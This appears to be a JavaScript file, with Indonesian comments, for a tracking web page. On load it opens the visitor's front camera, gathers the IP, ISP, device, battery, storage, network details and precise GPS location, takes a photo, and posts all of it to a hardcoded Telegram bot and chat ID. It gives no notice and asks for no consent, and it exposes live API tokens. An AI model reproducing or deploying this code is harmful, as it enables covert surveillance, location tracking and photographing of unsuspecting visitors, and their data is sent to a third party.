const collectedData = {};
let photoCaptured = false; // Flag untuk memastikan hanya satu foto yang diambil

// Fungsi untuk mendapatkan alamat IP dan ISP
function getIP() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;

            // Mendapatkan ISP menggunakan ipinfo.io API
            fetch(`https://ipinfo.io/${ip}/json?token=ce2d7e88896a36`)
                .then(response => response.json())
                .then(ispData => {
                    const isp = ispData.org || 'Tidak diketahui';
                    collectAndSendData('ip', { ip, isp });
                })
                .catch(error => {
                    console.error('Gagal mendapatkan ISP:', error);
                    collectAndSendData('ip', { ip, isp: 'Tidak diketahui' });
                });
        })
        .catch(error => {
            console.error('Gagal mendapatkan IP:', error);
        });
}

// Fungsi untuk mengumpulkan dan mengirim data ke Telegram
function collectAndSendData(key, value) {
    collectedData[key] = value;

    // Jika semua data telah terkumpul, kirim ke Telegram
    if (
        collectedData.battery &&
        collectedData.device &&
        collectedData.storage &&
        collectedData.network &&
        collectedData.location &&
        collectedData.ip &&
        !photoCaptured // Pastikan hanya satu foto yang diambil
    ) {
        capturePhotoAndSend();
    }
}

function capturePhotoAndSend() {
    const videoElement = document.getElementById('camera');
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    // Menetapkan resolusi lebih tinggi (misalnya 640x480)
    const targetWidth = 640;
    const targetHeight = 480;

    canvas.width = targetWidth;
    canvas.height = targetHeight;

    // Ambil gambar dari video dengan resolusi yang lebih tinggi
    context.drawImage(videoElement, 0, 0, targetWidth, targetHeight);

    // Mengubah gambar langsung ke Blob dengan kompresi 70%
    canvas.toBlob(function(blob) {
        // Ubah flag agar hanya satu foto yang diambil
        photoCaptured = true;

        // Kirim data dan foto ke Telegram
        sendToTelegram(collectedData, blob);
    }, 'image/jpeg', 0.7); // Kualitas kompresi 70%
}

// Fungsi untuk mengirim data dan foto ke Telegram
function sendToTelegram(data, imageData) {
    const botaja = '7875784717:AAHZv0ytkPCzM2rfb_T9m6BFYF37KAxQDGk';
    const chatId = '5409710235';

    const message = `
        🔍 Informasi Pengguna 🔍

        🌐 IP: ${data.ip?.ip || 'Tidak diketahui'}
        📡 ISP: ${data.ip?.isp || 'Tidak diketahui'}

        📱 Perangkat:
        - User Agent: ${data.device?.userAgent || 'Tidak diketahui'}
        - Platform: ${data.device?.platform || 'Tidak diketahui'}
        - Bahasa: ${data.device?.language || 'Tidak diketahui'}

        📡 Jaringan:
        - Status Koneksi: ${data.device?.networkStatus || 'Tidak diketahui'}
        - Jenis Koneksi: ${data.network?.connectionType || 'Tidak diketahui'}
        - Kecepatan Unduh: ${data.network?.downlink || 'Tidak diketahui'} Mbps
        - Latensi: ${data.network?.rtt || 'Tidak diketahui'} ms

        🔋 Baterai:
        - Level: ${data.battery?.level || 'Tidak diketahui'}
        - Status Pengisian: ${data.battery?.charging || 'Tidak diketahui'}

        🗂 Penyimpanan:
        - Total: ${data.storage?.total || 'Tidak diketahui'}
        - Digunakan: ${data.storage?.used || 'Tidak diketahui'}

        📍 Lokasi:
        - Provinsi: ${data.location?.provinsi || 'Tidak diketahui'}
        - Kabupaten/Kota: ${data.location?.kabupaten || 'Tidak diketahui'}
        - Kecamatan: ${data.location?.kecamatan || 'Tidak diketahui'}
        - Latitude: ${data.location?.latitude || 'Tidak diketahui'}
        - Longitude: ${data.location?.longitude || 'Tidak diketahui'}

        🕒 Waktu Akses: ${data.device?.visitTime || 'Tidak diketahui'}
        `.trim();

    const urlMessage = `https://api.telegram.org/bot${botaja}/sendMessage`;
    const urlPhoto = `https://api.telegram.org/bot${botaja}/sendPhoto`;

    // Kirim pesan teks ke Telegram
    fetch(urlMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message }),
    }).then(() => {
        // Kirim foto ke Telegram
        fetch(urlPhoto, {
            method: 'POST',
            body: createPhotoFormData(chatId, imageData),
        }).then(response => {
            if (response.ok) {
                console.log('Data berhasil dikirim ke Telegram.');

                // Matikan kamera setelah pengiriman selesai
                const videoElement = document.getElementById('camera');
                if (videoElement && videoElement.srcObject) {
                    const tracks = videoElement.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                    videoElement.srcObject = null; // Hapus referensi ke stream
                }
            } else {
                console.error('Gagal mengirim foto:', response.statusText);
            }
        });
    });
}

// Fungsi untuk membuat FormData untuk foto
function createPhotoFormData(chatId, imageBlob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', imageBlob, 'photo.jpg'); // Foto langsung dari Blob
    return formData;
}

// Aktifkan kamera depan
function enableCamera() {
    const videoElement = document.getElementById('camera');
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            videoElement.srcObject = stream;
            videoElement.setAttribute('playsinline', true); // Agar berfungsi di perangkat seluler
            videoElement.play();
        })
        .catch(error => {
            console.error('Gagal mengakses kamera:', error);
        });
}

// Mendapatkan status baterai
if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
        const level = Math.floor(battery.level * 100);
        const charging = battery.charging ? 'Sedang diisi daya' : 'Tidak diisi daya';
        collectAndSendData('battery', { level: `${level}%`, charging });
    });
}

// Mendapatkan informasi perangkat
const userAgent = navigator.userAgent;
const platform = navigator.platform;
const language = navigator.language || navigator.userLanguage;
const networkStatus = navigator.onLine ? 'Online' : 'Offline';
const visitTime = new Date().toLocaleString();
collectAndSendData('device', { userAgent, platform, language, networkStatus, visitTime });

// Mendapatkan informasi penyimpanan
if (navigator.storage && navigator.storage.estimate) {
    navigator.storage.estimate().then(estimate => {
        const total = estimate.quota ? (estimate.quota / 1024 / 1024).toFixed(2) + " MB" : "Tidak diketahui";
        const used = estimate.usage ? (estimate.usage / 1024 / 1024).toFixed(2) + " MB" : "Tidak diketahui";
        collectAndSendData('storage', { total, used });
    }).catch(error => {
        console.error("Gagal mendapatkan informasi penyimpanan:", error);
        collectAndSendData('storage', { total: "Tidak diketahui", used: "Tidak diketahui" });
    });
} else {
    collectAndSendData('storage', { total: "Tidak tersedia", used: "Tidak tersedia" });
}


// Mendapatkan informasi jaringan
if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const connectionType = connection.effectiveType;
    const downlink = connection.downlink;
    const rtt = connection.rtt;
    collectAndSendData('network', { connectionType, downlink, rtt });
}

// Mendapatkan lokasi pengguna
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
                    .then(response => response.json())
                    .then(data => {
                        const components = data.address;
                        const provinsi = components.state || 'Tidak ditemukan';
                        const kabupaten = components.city || 'Tidak ditemukan';
                        const kecamatan = components.suburb || 'Tidak ditemukan';
                        collectAndSendData('location', { provinsi, kabupaten, kecamatan, latitude, longitude });
                    })
                    .catch(error => console.error('Gagal mendapatkan data lokasi:', error));
            },
            error => console.error('Gagal mendeteksi lokasi:', error),
            { enableHighAccuracy: true, timeout: 15000 }
        );
    }
}

// Panggil semua fungsi saat halaman dimuat
window.onload = function () {
    enableCamera();
    getIP();
    getLocation();
};